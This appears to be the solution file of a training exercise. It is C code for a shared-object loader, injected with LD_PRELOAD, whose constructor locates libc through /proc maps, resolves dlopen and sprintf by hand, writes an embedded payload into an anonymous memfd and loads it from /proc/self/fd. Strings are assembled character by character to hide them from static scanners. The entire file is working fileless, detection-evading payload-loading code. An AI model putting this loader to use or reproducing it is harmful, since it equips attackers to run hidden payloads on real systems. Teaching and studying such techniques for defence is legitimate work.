/*
 * Exercise 3 Solution — Complete no-libc loader
 *
 * Built as a shared object, loaded via LD_PRELOAD into the tester
 * binary (which guarantees libc is mapped).
 */
#include "syscall.h"
#include "minstr.h"
#include "ex3_procfsutil_solution.h"
#include "ex3_elfsym_solution.h"
#include "payload_bytes.h"

#include <elf.h>
#include <fcntl.h>
#include <stdint.h>

#ifndef RTLD_NOW
#define RTLD_NOW 0x00002
#endif

#define STACK_STR_LIBCSO(var)                                                 \
  char var[8];                                                                \
  var[0]='l'; var[1]='i'; var[2]='b'; var[3]='c';                            \
  var[4]='.'; var[5]='s'; var[6]='o'; var[7]='\0';

#define STACK_STR_RXP(var)                                                    \
  char var[5];                                                                \
  var[0]='r'; var[1]='-'; var[2]='x'; var[3]='p'; var[4]='\0';

#define STACK_STR_DLOPEN(var)                                                 \
  char var[7];                                                                \
  var[0]='d'; var[1]='l'; var[2]='o'; var[3]='p';                            \
  var[4]='e'; var[5]='n'; var[6]='\0';

#define STACK_STR_SPRINTF(var)                                                \
  char var[8];                                                                \
  var[0]='s'; var[1]='p'; var[2]='r'; var[3]='i';                            \
  var[4]='n'; var[5]='t'; var[6]='f'; var[7]='\0';

#define STACK_STR_PROC_FD(var)                                                \
  char var[17];                                                               \
  var[0]='/';  var[1]='p';  var[2]='r';  var[3]='o';                         \
  var[4]='c';  var[5]='/';  var[6]='s';  var[7]='e';                         \
  var[8]='l';  var[9]='f';  var[10]='/'; var[11]='f';                        \
  var[12]='d'; var[13]='/'; var[14]='%'; var[15]='d';                        \
  var[16]='\0';

typedef void *(*dlopen_func_t)(const char *, int);
typedef int   (*sprintf_func_t)(char *, const char *, ...);

static void msg(const char *s)
{
    sys_write(2, s, strlen(s));
}

__attribute__((constructor))
void loader_main(void)
{
    msg("[ex3] no-libc loader starting\n");

    /* Step 1: find libc base */
    uintptr_t libc_base = 0;
    STACK_STR_LIBCSO(libc_str);
    STACK_STR_RXP(perm);
    if (search_lib_procmaps(libc_str, perm, &libc_base) != 0) {
        msg("[-] libc not found\n");
        return;
    }
    msg("[ex3] found libc\n");

    /* Step 2: resolve dlopen and sprintf */
    STACK_STR_DLOPEN(str_dlopen);
    STACK_STR_SPRINTF(str_sprintf);
    dlopen_func_t g_dlopen =
        (dlopen_func_t)find_symbol_symtab((void *)libc_base, str_dlopen);
    sprintf_func_t g_sprintf =
        (sprintf_func_t)find_symbol_symtab((void *)libc_base, str_sprintf);

    if (!g_dlopen)  { msg("[-] dlopen not found\n");  return; }
    if (!g_sprintf) { msg("[-] sprintf not found\n"); return; }
    msg("[ex3] resolved dlopen + sprintf\n");

    /* Step 3: create memfd and write SO bytes */
    char name[2] = {'x', '\0'};
    int mem_fd = sys_memfd_create(name, MFD_CLOEXEC);
    if (mem_fd < 0) { msg("[-] memfd_create failed\n"); return; }

    sys_write(mem_fd, payload_bytes, payload_bytes_len);

    /* Step 4: build path and dlopen */
    char proc_path[64];
    STACK_STR_PROC_FD(fd_fmt);
    g_sprintf(proc_path, fd_fmt, mem_fd);

    msg("[ex3] loading via ");
    msg(proc_path);
    msg("\n");

    g_dlopen(proc_path, RTLD_NOW);
    msg("[ex3] done\n");
}
